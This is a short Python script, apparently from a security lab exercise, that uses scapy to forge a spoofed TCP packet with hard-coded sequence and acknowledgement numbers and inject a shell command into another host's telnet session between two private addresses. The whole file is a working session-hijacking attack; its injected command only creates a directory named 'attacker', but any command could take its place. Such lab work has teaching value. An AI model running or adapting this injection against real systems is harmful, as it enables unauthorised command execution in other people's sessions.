#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.195", dst = "10.10.10.193")
TCPLayer = TCP (sport=44902, dport=23, flags="A", seq=3696326137, ack=3918646930)

data = "\n mkdir /home/msfadmin/attacker \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)

send(pkt,verbose=0)
